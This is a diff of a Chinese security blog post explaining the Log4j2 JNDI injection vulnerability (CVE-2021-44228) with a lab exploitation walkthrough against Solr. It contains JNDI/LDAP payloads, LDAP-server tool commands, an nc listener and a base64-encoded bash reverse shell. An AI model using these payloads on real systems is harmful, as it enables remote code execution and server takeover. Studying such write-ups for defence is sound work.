@@ -16,16 +16,29 @@
   <meta name="author" content="August Rosenberg">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
+    <meta name="description" content="简介Apache log4j 是Apache 的一个开源项目， Apache log4j2 是一个Java 的日志记录工具。该工具重写了log4j 框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。 漏洞简介log4j2 中存在JNDI 注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Log4j2">
 <meta property="og:url" content="https://tsy244.github.io/2024/01/20/%E6%B8%97%E9%80%8F/Log4j2/index.html">
 <meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="简介Apache log4j 是Apache 的一个开源项目， Apache log4j2 是一个Java 的日志记录工具。该工具重写了log4j 框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。 漏洞简介log4j2 中存在JNDI 注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120231646952.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120231715299.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120231932985.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120231926897.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120233645712.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120233711167.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120234927739.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120234948111.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120234958286.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240121000137942.png">
 <meta property="article:published_time" content="2024-01-20T14:44:16.000Z">
-<meta property="article:modified_time" content="2024-01-20T14:44:47.768Z">
+<meta property="article:modified_time" content="2024-01-20T16:03:03.821Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120231646952.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -225,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 words
+          2.6k words
         
       </span>
     
@@ -236,7 +249,7 @@
         
         
         
-          1 mins
+          23 mins
         
       </span>
     
@@ -279,7 +292,92 @@
             
               <div class="markdown-body">
                 
-                
+                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Apache log4j 是Apache 的一个开源项目， Apache log4j2 是一个Java 的日志记录工具。该工具重写了log4j 框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。</p>
+<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>log4j2 中存在JNDI 注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码。</p>
+<p>下面是触发漏洞的两部分关键代码：</p>
+<ol>
+<li>org.apache.logging.log4j.core.pattern.MessagePatternConverter 的 format() 方法（表达式内容替换）：<br>  这部分内容重点就在于代码的主要内容就是一旦发现日志中包含 ${ 就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行。在 ${ 中可以使用的部分关键词如下：</li>
+</ol>
+<p>  log4j2</p>
+  <figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;java:version&#125;    <span class="hljs-built_in">getSystemProperty</span>(&quot;java.version&quot;)<br>$&#123;java:runtime&#125;    <span class="hljs-built_in">getRuntime</span>()<br>$&#123;java:vm&#125;    <span class="hljs-built_in">getVirtualMachine</span>()<br>$&#123;java:os&#125;    <span class="hljs-built_in">getOperatingSystem</span>()<br>$&#123;java:hw&#125;    <span class="hljs-built_in">getHardware</span>()<br>$&#123;java:locale&#125;    <span class="hljs-built_in">getLocale</span>()<br></code></pre></td></tr></table></figure>
+
+<p>  linux</p>
+  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;<span class="hljs-built_in">env</span>:CLASSPATH&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;<span class="hljs-built_in">env</span>:HOME&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;<span class="hljs-built_in">env</span>:JAVA_HOME&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;<span class="hljs-built_in">env</span>:LANG&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;<span class="hljs-built_in">env</span>:LC_TERMINAL&#125;</span><br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>apache.logging.log4j.core.lookup.StrSubstitutor（提取字符串，并通过 lookup 进行内容替换）</li>
+</ol>
+<p>  日志在打印时当遇到 ${ 后，Interpolator 类以:号作为分割，将表达式内容分割成两部分，前面部分作<br>  为 preﬁx，后面部分作为 key。然后通过 preﬁx 去找对应的 lookup，通过对应的 lookup 实例调用lookup 方法，最后将 key 作为参数带入执行。<br>  由于log4j2 支持很多协议，例如通过 ldap 查找变量，通过 docker 查找变量，通过rmi等等。目前看到使用最多的主要是使用ldap来构造payload:</p>
+  <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$&#123;jndi:ldap:<span class="hljs-regexp">//ip</span><span class="hljs-regexp">/port/</span><span class="hljs-keyword">exp</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>  最终效果就是通过 jndi 注入，借助 ldap 服务来下载执行恶意 payload，从而执行命令<br>  整个利用流程分两步：<br>  第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址。<br>  第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令。<br>  整个利用流程如图所示：</p>
+<h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><ol>
+<li><p>影响组件应用</p>
+<blockquote>
+<p>Apache Struts2<br>Apache Solr Apache Druid Apache Flink<br>srping-boot-strater-log4j2</p>
+</blockquote>
+</li>
+<li><p>影响Log4j版本</p>
+<blockquote>
+<p>Apache Log4j 2.0 ~ 2.15.0-rc1</p>
+</blockquote>
+</li>
+</ol>
+<h1 id="证明漏洞"><a href="#证明漏洞" class="headerlink" title="证明漏洞"></a>证明漏洞</h1><p>http: &#x2F;&#x2F;dnslog.cn&#x2F;<br>https: &#x2F;&#x2F;<a target="_blank" rel="noopener" href="http://www.callback.red/">www.callback.red/</a></p>
+<blockquote>
+<p>${jndi:ldap:&#x2F;&#x2F;9xovk0.dnslog.cn}</p>
+</blockquote>
+<blockquote>
+<p>${jndi:ldap:&#x2F;&#x2F;${sys:java.version}.vebwc2.dnslog.cn}</p>
+</blockquote>
+<blockquote>
+<p><a href="http://IP地址:端口/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.vebwc2.dnslog.cn}">http://IP地址:端口/solr/admin/cores?action=${jndi:ldap://${sys:java.version}.vebwc2.dnslog.cn}</a></p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120231646952.png" srcset="/img/loading.gif" lazyload alt="image-20240120231646952"></p>
+<p>发现已经被解析了</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120231715299.png" srcset="/img/loading.gif" lazyload alt="image-20240120231715299"></p>
+<p>说明存在漏洞</p>
+<p>现在我想测试处java的版本，只需要利用上问提到的log4j2相关的变量就可以了</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120231932985.png" srcset="/img/loading.gif" lazyload alt="image-20240120231932985"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120231926897.png" srcset="/img/loading.gif" lazyload alt="image-20240120231926897"></p>
+<h1 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><ol>
+<li><p>这个是使用gndi注入利用的</p>
+</li>
+<li><p>启动http服务，该目录下有exploit.class</p>
+</li>
+<li><p>启动ldap服务</p>
+<p>直接执行反弹shell</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.LDAPRefServer <span class="hljs-string">&quot;http://120.27.61.239:8000/#Exploit&quot;</span> <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>监听端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">22345</span><br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>使用jndi  ldap协议访问</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.128</span>:<span class="hljs-number">8983</span><span class="hljs-regexp">/solr/</span>admin<span class="hljs-regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="hljs-regexp">/192.168.79.1:9999/</span>Exploit&#125;<br></code></pre></td></tr></table></figure>
+
+<p>访问的是开启了ldap服务的地址</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120233645712.png" srcset="/img/loading.gif" lazyload alt="image-20240120233645712"></p>
+</li>
+<li><p>成功反弹</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120233711167.png" srcset="/img/loading.gif" lazyload alt="image-20240120233711167"></p>
+</li>
+</ol>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>利用fastjson的工具，自动化生成一个ldap服务器</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp fastjson_tool.jar fastjson.HLDAPServer <span class="hljs-number">192.168.79.1</span> <span class="hljs-number">9999</span> <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc5LjEzOC8yMjM0NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120234927739.png" srcset="/img/loading.gif" lazyload alt="image-20240120234927739"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120234948111.png" srcset="/img/loading.gif" lazyload alt="image-20240120234948111"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240120234958286.png" srcset="/img/loading.gif" lazyload alt="image-20240120234958286"></p>
+<h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/welk1n/</span>JNDI-Injection-Exploit<span class="hljs-regexp">/releases/</span>tag/v1.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<p>直接使用工具</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar .\JNDI-Injection-Exploit-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar -C <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljc5LjEzOC8yMjM0NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -A <span class="hljs-number">192.168.79.1</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/SpringBoot/image-20240121000137942.png" srcset="/img/loading.gif" lazyload alt="image-20240121000137942"></p>
+<p>复制直接用，我测试的时候是需要等一下，不知道为什么</p>
+
                 
               </div>
             
